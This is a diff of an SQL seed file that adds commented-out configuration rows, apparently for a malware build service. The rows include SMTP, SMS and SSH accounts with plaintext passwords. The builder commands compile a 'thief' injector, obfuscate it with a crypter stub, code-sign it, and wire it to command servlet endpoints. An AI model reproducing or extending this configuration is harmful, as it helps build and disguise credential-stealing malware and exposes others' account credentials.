@@ -143,3 +143,42 @@ insert into category_item(id,category_id,item_id)
         values ('72fab541-593e-48ef-882e-e226775f0b6f','34a56bf2-f7b5-4649-b087-cf1b34c5e739','72fab541-593e-48ef-882e-e226775f0b6f');
 insert into category_item(id,category_id,item_id)
         values ('6a20e159-7951-4f65-88f8-3b5696e411fd','a00ce058-a855-407c-ac37-641f8f46fa43','6a20e159-7951-4f65-88f8-3b5696e411fd');
+
+
+--smtp account
+-- insert into email(id,smtp_server,smtp_port,username,password) values('29e2dbc6-85d7-4be7-b61b-f6e7e9ace893','smtp.mail.ru',587,'ru_vatnik@mail.ru','vatnik');
+-- insert into email(id,smtp_server,smtp_port,username,password) values('c0846837-6614-4171-aac4-52bda5d74cab','smtp.gmail.com',587,'uglarius@gmail.com','1qaz@wsx3EDC');
+--sms account
+-- insert into email(id,username,password) values('d7651309-e8f4-47d5-a5a7-e4930456eae9','alskdjf.lsdkjf@mail.ru','Bfp6Gkd');
+-- insert into sms(id,service_name,email_id,credential_login,credential_password) values('1f3eb80b-8357-4f64-955e-15d4f7fba30a','sms24x7.ru','d7651309-e8f4-47d5-a5a7-e4930456eae9','alskdjf.lsdkjf@mail.ru','Bfp6Gkd');
+
+--only one row settings
+-- insert into settings(id) values(1);
+-- update settings set
+-- 		clipper_id='29fe5837-9060-4503-9593-28db9520cb01',
+-- 		clipper_xpath_wait='//html[@clipped=''1'']',
+-- 		clipper_jquery_url='http://localhost:8080/pub/rest/pub/jquery.js'
+-- 	where id = 1;
+-- update settings set
+-- 		builder_host='192.168.10.188',
+-- 		builder_ssh_port=22,
+-- 		builder_ssh_login='ugl',
+-- 		builder_ssh_password='123'
+-- 	where id = 1;
+-- update settings set
+-- 		builder_cmd_run='"C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\SetEnv.Cmd" & C:\zagr\builder\run.bat',
+--  		builder_exe='C:\zagr\ncrypt\Debug\out\stub.exe',
+--  		builder_build_command = 'C:\zagr\builder\builder.py -r -s C:\zagr\thief\',
+--  		builder_encrypt_command = 'C:\zagr\ncrypt\Debug\builder.exe -i C:\zagr\thief\Rls\injector.exe -m 5 -r 80/10/10 -d C:\zagr\ncrypt\stub_project\ -p stub_project.vcxproj -o C:\zagr\ncrypt\Debug\out\ -b',
+--  		builder_sign_command = 'signtool.exe sign /v /n "Ugl SPC" C:\zagr\ncrypt\Debug\out\stub.exe',
+--  		builder_app_host = 'http://192.168.10.143:8080',
+--  		builder_upload_path='C:\zagr\builder\run.bat',
+--  		builder_wait_timeout=10
+--  		builder_bat='C:\zagr\builder\builder.py -r -s C:\zagr\thief\ -a http://192.168.10.143:8080/ug/resources/InterfaceServlet -f http://192.168.10.143:8080/ug/resources/CommandServlet & C:\zagr\ncrypt\Debug\builder.exe -i C:\zagr\thief\Rls\injector.exe -m 5 -r 80/10/10 -d C:\zagr\ncrypt\stub_project\ -p stub_project.vcxproj -o C:\zagr\ncrypt\Debug\out\ -b & signtool.exe sign /v /n "Ugl SPC" /t http://timestamp.verisign.com/scripts/timstamp.dll C:\zagr\ncrypt\Debug\out\stub.exe',
+-- 	where id = 1;
+-- update settings set
+-- 		smtp_id='c0846837-6614-4171-aac4-52bda5d74cab'
+-- 	where id = 1;
+-- update settings set
+-- 		sms_id='1f3eb80b-8357-4f64-955e-15d4f7fba30a'
+-- 	where id = 1;
